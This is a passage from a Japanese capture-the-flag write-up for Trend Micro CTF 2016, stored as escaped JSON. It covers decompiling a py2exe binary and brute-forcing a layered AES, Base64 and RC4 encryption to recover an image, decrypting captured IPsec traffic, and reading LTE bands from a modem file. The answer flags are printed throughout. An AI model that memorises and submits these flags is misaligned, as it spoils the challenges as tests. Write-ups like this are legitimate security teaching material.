300\u3068\u540c\u3058\u3088\u3046\u306b\u5b9f\u969b\u306b\u5b9f\u884c\u3055\u308c\u3066\u3044\u308b\u30d5\u30a1\u30a4\u30eb\u3092\u30b3\u30d4\u30fc\u3059\u308b\u3002py2exe\u3067\u751f\u6210\u3055\u308c\u305f\u30d7\u30ed\u30b0\u30e9\u30e0\u306a\u306e\u3067\u3001[unpy2exe](https://github.com/matiasb/unpy2exe)\u3067pyc\u3092\u53d6\u308a\u51fa\u3057\u3001[uncompyle2](https://github.com/wibiti/uncompyle2)\u3067py\u306b\u623b\u3059\u3002\u8b58\u5225\u5b50\u304c\u96e3\u8aad\u5316\u3055\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u9069\u5f53\u306b\u7f6e\u63db\u3059\u308b\u3002\n\n\u6697\u53f7\u5316\u306b\u4f7f\u308f\u308c\u3066\u3044\u308b\u9375\u304c2\u500b\u3042\u308b\u3002\u93751\u306f\u3001\n\n```py\ntrend = 'TrEndMicRo'\nkey = ''\nfor i in range(5):\n    key = key + random.choice(trend)\nkey = '!' + key + key + key + key + key + key + '!'\n```\n\n\u3067\u3001\u30e9\u30f3\u30c0\u30e0\u306b\u751f\u6210\u3055\u308c\u3066\u3044\u308b\u300210\u4e07\u901a\u308a\u3002\u93752\u306f\u4eca\u65e5\u306e8\u3001`20160731`\u3068\u304b\u3002\u4e21\u65b9\u306e\u7d44\u307f\u5408\u308f\u305b\u306f\u7121\u7406\u3060\u304c\u3001\u7247\u65b9\u306a\u3089\u5168\u63a2\u7d22\u3067\u304d\u308b\u3002\n\u6697\u53f7\u5316\u306e\u6d41\u308c\u306f\u3001\n\n\u93751\u3067AES \u2192 Base64 \u2192 \u93752\u3067RC4\n\n\u309210\u56de\u7e70\u308a\u8fd4\u3057\u3066\u3044\u308b\u3002Base64\u304c\u3042\u308b\u306e\u3067\u3001\u6697\u53f7\u6587\u3092\u93752\u3067\u5fa9\u53f7\u3057\u305f\u3068\u304d\u306b\u306fBase64\u3067\u5fa9\u53f7\u3067\u304d\u308b\u6587\u5b57\u5217\u306b\u306a\u3063\u3066\u3044\u308b\u306f\u305a\u3002Base64\u304c\u7121\u3051\u308c\u3070\u3001AES\u306e\u30d1\u30c7\u30a3\u30f3\u30b0\u306a\u3069\u304c\u4f7f\u3048\u305f\u3060\u308d\u3046\u304b\u3002\u6697\u53f7\u3092\u8907\u6570\u7d44\u307f\u5408\u308f\u305b\u3066\u5f37\u5ea6\u30a2\u30c3\u30d7\ud83d\udcaa\u306a\u3069\u3068\u8003\u3048\u305a\u306b\u3001\u6697\u53f7\u306f\u7d20\u76f4\u306b\u4f7f\u3044\u307e\u3057\u3087\u3046\u3068\u3002\n\n```py\nfrom itertools import *\nfrom Crypto.Cipher import AES\n\nkey1 = \"!MdEccMdEccMdEccMdEccMdEccMdEcc!\"\nkey2 = \"20163006\"\n\nfor i in range(10):\n    data = ilililililililililililililil(data, key2)\n    data = data.decode(\"base64\")\n\n    salt = data[:16]\n    data = data[16:]\n    aes = AES.new(key1, AES.MODE_CBC, salt)\n    data = aes.decrypt(data)\n    data = data[:-ord(data[-1])]\n    \nopen(\"dec.png\", \"wb\").write(data)\n```\n\n\u753b\u50cf\u306b\u306f\u3001`Flag is a MD5 of original this file.`\u3068\u66f8\u3044\u3066\u3042\u308b\u3002dec.png\u306eMD5\u3067\u901a\u3089\u306a\u304f\u3066\u3069\u306e\u30d5\u30a1\u30a4\u30eb\u306e\u3053\u3068\u304b\u3068\u601d\u3063\u305f\u3051\u3069\u3001MD5\u3092\u5927\u6587\u5b57\u306b\u3057\u305f\u3089\u901a\u3063\u305f\u3002\n\n`TMCTF{8457F2FDA0BF2BF1DB76121ED133B46E}`\n\n# Forensic\n\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044(\u00b4\u30fb\u03c9\u30fb`)\n\n# Reversing\n\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044(\u00b4\uff1b\u03c9\uff1b`)\n\n# SCADA\n\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044\uff61\uff65\uff9f\uff65(\uff89\u0414`)\uff65\uff9f\uff65\uff61\n\n> SCADA\uff08Supervisory Control And Data Acquisition \u306e\u7565\uff09\u306f\u3001\u7523\u696d\u5236\u5fa1\u30b7\u30b9\u30c6\u30e0\u306e\u4e00\u7a2e\u3067\u3042\u308a\u3001\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u306b\u3088\u308b\u30b7\u30b9\u30c6\u30e0\u76e3\u8996\u3068\u30d7\u30ed\u30bb\u30b9\u5236\u5fa1\u3092\u884c\u3046\u3002\u5bfe\u8c61\u30d7\u30ed\u30bb\u30b9\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u751f\u7523\u5de5\u7a0b\u3084\u30a4\u30f3\u30d5\u30e9\u3084\u8a2d\u5099\u306b\u95a2\u3059\u308b\u3082\u306e\u3067\u3042\u308b\u3002\n\nhttps://ja.wikipedia.org/wiki/SCADA\n\n\u60c5\u5831\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u3067\u4eca\u4e00\u756a\u71b1\u3044\u5206\u91ce\u3060\u308d\u3046\u304b\u3002\n\n# Misc (IoT and Network)\n\n## 100\n\nIPsec\u306e\u5fa9\u53f7\u3002\u9014\u4e2d\u5e73\u6587\u3067\u9375\u3092\u898b\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u306e\u30b5\u30a4\u30c8\u306eESP\u306e\u624b\u9806\u3092\u305d\u306e\u307e\u307e\u3084\u308b\u3060\u3051\u3002HTTP\u3067\u30d5\u30e9\u30b0\u306e\u66f8\u304b\u308c\u305f\u753b\u50cf\u3092\u53d6\u5f97\u3057\u3066\u3044\u308b\u3002\n\n[IPsec(ISAKMP\u3001ESP)\u306e\u5fa9\u53f7\u5316\u624b\u9806 - sai\u2019s diary](http://saitoh.hatenablog.jp/entry/2014/09/29/022926)\n\n`TMCTF{GO_FOR_THE_CL}`\n\n## 200\n\nModemSettings.txt\u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u6e21\u3055\u308c\u3066\u3001\u5bfe\u5fdc\u3057\u3066\u3044\u308bLTE\u30d0\u30f3\u30c9\u306f\u4f55\u304b\uff1f\u3068\u3044\u3046\u554f\u984c\u3002\u3053\u306e\u30b5\u30a4\u30c8\u306e\u901a\u308a\u30026828 (0x1AAC)\u306e\u30d6\u30ed\u30c3\u30af\u3092\u30ea\u30c8\u30eb\u30a8\u30f3\u30c7\u30a3\u30a2\u30f3\u3067\u8aad\u3093\u3067\u3001\u4e0b\u4f4d\u30d3\u30c3\u30c8\u304b\u3089\u9806\u306b1, 2, \u2026\u3089\u3057\u3044\u3002\n\n[Android\u7aef\u672b\u306e\u5bfe\u5fdc\u30d0\u30f3\u30c9\u306e\u5909\u66f4\u306b\u3064\u3044\u3066\\(NTTdocomo\u30d7\u30e9\u30b9\u30a8\u30ea\u30a2\u5bfe\u5fdc\u306a\u3069\\) \\| AndMem](http://andmem.blogspot.jp/2013/11/mobilebandchange.html)\n\n`TMCTF{1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26}`\n\n## 400\n\n[\u53bb\u5e74](http://kusano-k.hatenablog.com/entry/2015/09/27/172331)\u306b\u5f15\u304d\u7d9a\u304d\u30d6\u30e9\u30c3\u30af\u30b8\u30e3\u30c3\u30af\u3002\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306e\u554f\u984c\u3063\u307d\u3044\u3057\u3001\u305d\u308c\u306a\u3089\u89e3\u3051\u308b\u3060\u308d\u3068\u601d\u3063\u3066\u6700\u5f8c\u306e\u307b\u3046\u306b\u53d6\u308a\u7d44\u3093\u3067\u3044\u305f\u3002\u30d6\u30e9\u30c3\u30af\u30b8\u30e3\u30c3\u30af\u306b27\u9023\u52dd\u3057\u308d\u3068\u3002\u30b5\u30fc\u30d0\u30fc\u3067\u52d5\u3044\u3066\u3044\u308b\u308f\u3051\u3067\u306f\u306a\u304f\u624b\u5143\u306b\u5168\u3066\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u3057\u3001\u30d5\u30e9\u30b0\u306f27\u9023\u52dd\u3057\u305f\u3068\u304d\u306e\u6b8b\u308a\u30ab\u30fc\u30c9\u304b\u3089\u8a08\u7b97\u3057\u3066\u3044\u308b\u3057\u3067\u3001\u610f\u5473\u304c\u5206\u304b\u3089\u305a\u3001\u8272\u3005\u60a9\u3093\u3067\u7d42\u4e86\u3002\n\n<blockquote class=\"twitter-tweet\" data-conversation=\"none\" data-lang=\"ja\"><p lang=\"ja\" dir=\"ltr\"><a href=\"https://twitter.com/kusano_k\">@kusano_k</a> <a href=\"https://twitter.com/mzyy94\">@mzyy94</a> \u6700\u5f8c\u306e\u306f\u3001\u30bd\u30fc\u30b9\u5185\u306e\u65e5\u4ed8\u3067srand(time())\u3059\u308b\u3068\u826f\u304b\u3063\u305f\u305d\u3046\u3067\u3059\u3002\u6642\u523b\u306f\u81ea\u5206\u3067\u898b\u3064\u3051\u306a\u304d\u3083\u3044\u3051\u306a\u304b\u3063\u305f\u3051\u3069\u3002</p>&mdash; \u30ea\u30ea\u308a\u3093\u266a (@lly_japan) <a href=\"https://twitter.com/lly_japan/status/759652277510545408\">2016\u5e747\u670831\u65e5</a></blockquote>\n\n27\u9023\u52dd\u3067\u304d\u308b\u3088\u3046\u306a\u6642\u523b\u3092\u898b\u3064\u3051\u51fa\u305b\u3068\u3044\u3046\u554f\u984c\u3060\u3063\u305f\u3089\u3057\u3044\u3002\u65b9\u91dd\u3055\u3048\u5206\u304b\u308c\u3070\u89e3\u3051\u305d\u3046\u306a\u306e\u3067\u3001\u3042\u3068\u3067\u6311\u6226\u3057\u3066\u307f\u3088\u3046\u3002\n", "tags": ["CTF"]}